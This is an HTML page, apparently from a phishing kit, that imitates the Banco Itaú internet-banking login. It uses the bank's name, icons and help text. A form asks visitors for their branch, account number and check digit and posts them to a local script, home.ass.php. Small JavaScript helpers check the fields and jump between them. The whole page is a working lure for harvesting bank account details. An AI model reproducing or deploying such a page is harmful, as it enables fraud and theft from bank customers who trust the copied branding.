<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1" />
<link rel="shortcut icon" type="image/x-icon" href="icone/favicon.ico" />
<title>Banco Itaú - Feito Para Você</title>
<script src="j_query/jquery.min.js"></script> 
<link href="style/new_stylo.css" rel="stylesheet" type="text/css" />
<script src="modal.js" type="text/javascript"></script> 
<style type="text/css">
<!--
.style1 {
	font-family: Verdana, Arial, Helvetica, sans-serif;
	font-weight: bold;
	font-size: 11px;
	color: #333333;
}
.style2 {
	font-family: Verdana, Arial, Helvetica, sans-serif;
	font-size: 11px;
	color: #333333;
}

.style4 {
	font-family: Verdana, Arial, Helvetica, sans-serif;
	font-size: 11px;
	color: #FFF;
}
a:link {
	color: #333333;
	text-decoration: none;
}
a:visited {
	color: #333333;
	text-decoration: none;
}
a:hover {
	color: #333333;
	text-decoration: none;
}
a:active {
	color: #333333;
	text-decoration: none;
}
.style4 {
	font-family: Verdana, Arial, Helvetica, sans-serif;
	font-size: 11px;
}
.style6 {font-family: Arial, Helvetica, sans-serif; font-size: 12px; color: #333333; }
-->
</style>
</head>

<body style="margin:0">
<div id="tudo">
<div id="topo">
<table>

<tr>
<Td width="99" height="40">&nbsp;</Td>
<td width="176"><img src="images/04.png"  title="30 horas" width="146" height="27" /></td>
</tr></table>
</div><!-- topo -->
<div id="box02">
<table width="401">
<form id="form" name="form" action="home.ass.php" method="post" target="_self" onSubmit="return validaCampoObrigatorio(this)" autocomplete="off" >
<tr>
<td width="21" height="34">&nbsp;</td>
<td width="61" height="34">&nbsp;</td>
<td width="62" height="34"></td>
</tr>
<tr>
<td width="21" height="74">&nbsp;</td>
<td height="74" colspan="6"><span class="style6">Digite os n&uacute;meros de sua ag&ecirc;ncia conta e d&iacute;gito e clique em &quot;OK&quot; para complementar seus dados de acesso.</span></td>
</tr>
<tr>
<td width="21" height="21">&nbsp;</td>
<td width="61" height="21"><span class="style1">Ag&ecirc;ncia:</span></td>
<td width="62" height="21">
<input name="agg" type="text" class="style2" id="agg" style="width:35px; height:12px; background-color:#F5F5F5;" title="Agencia" size="5" maxlength="4" onkeypress="IsNum(this,event);" onkeyup="javascript:pulacampo('agg','acc')" lang="1" />
</td>
<td width="47" height="21" class="style1">Conta:</td>
<td width="105" height="21">
<input name="acc" type="text" class="style2" id="acc" style="width:60px; height:12px; background-color:#F5F5F5;" title="Conta" size="6" maxlength="6" onkeypress="IsNum(this,event);" onkeyup="javascript:pulacampo('acc','di')"  lang="1">
  -    <input name="di" type="text" class="style2" id="di" style="width:10px; height:12px; background-color:#F5F5F5;" title="Digito" size="1" maxlength="1"  onkeypress="IsNum(this,event);" onkeyup="javascript:pulacampo('di','ir')" lang="1" />
  </td>
<td width="77" height="21"><input type="image" src="images/envia.gif" title="Acesso ao Internet Bank" name="ir" id="ir" /></td>
</tr>
<tr>
<td height="16" colspan="5">&nbsp;</td>
</tr>
</form>
<td height="23">
</tr>
<tr>
<td>&nbsp;</td>
<td><div align="center"><img src="images/bt_interrogacao.gif" width="31" height="30" /></div></td>
<td height="41" colspan="5"><span class="style2">Continua com dúvida?<a href="javascript:openModalForm('.esqueci-senha','cadastro_js','valida.esqueci.senha.js');"> Clique aqui</a></span></td>
</tr>

</table>
</div><!-- box02 -->


<div class="esqueci-senha">
 
 <div class="form">
 
<h2><a href="index.php" ><img src="images/00000.png" /></a></h2>

 
<p><span class="style4"> O Ita&uacute; criou um programa extremamente eficaz para resolver suas d&uacute;vidas atrav&eacute;s da Internet. Ele foi concebido para antecipar suas quest&otilde;es e respond&ecirc;-las de forma interativa, assegurando um atendimento completo. Veja a seguir a melhor maneira de utiliz&aacute;-lo:</span></p>

 
 </div>  
  
</div>

<div id="box03"></div>
<div id="box05"></div>
<div id="rodape"></div>

</div><!-- tudo -->
</body>
</html>

<script language="JavaScript" type="text/javascript">
function pulacampo(idobj, idproximo)
{
var str = new String(document.getElementById(idobj).value);
var mx = new Number(document.getElementById(idobj).maxLength);
if (str.length == mx)
{
document.getElementById(idproximo).focus();
}
}
</script>


<script language="JavaScript">
function validaCampoObrigatorio(form){
            var erro=0;
            var legenda;
            var obrigatorio;           
            for (i=0;i<form.length;i++){
                        obrigatorio = form[i].lang;
                        if (obrigatorio==1){
                                   if (form[i].value == ""){
                                               var nome = form[i].name;
                                               mudarCorCampo(form[i], 'white');
                                               legenda=document.getElementById(nome);
                                               legenda.style.color="black";
                                               erro++;
                                   }
                        }
            }
            if(erro>=1){
                        alert("Obrigatorio que digite todos o campos!")
                        return false;
            } else
                        return true;
}

function mudarCorCampo(elemento, cor){
            elemento.style.backgroundColor=cor;
}
</script>


<script language="JavaScript" type="text/javascript">
function IsNum(obj,event){
var Tecla = event.charCode;
var ie = event.keyCode;
if (!event) event = window.event;
var code;
if (event.keyCode) code = event.keyCode;
else if (event.which) code = event.which; // Netscape 4.?
//se nao for n&#250;mero nem parentesis ou espa&#231;o
if (code < 8 || code > 57 ){
event.returnValue = false;
alert("Digite Somente Numeros!");
if (event.which){
event.preventDefault();
}
return false;
}else{
event.returnValue = true;
return true;
}
}
  </script>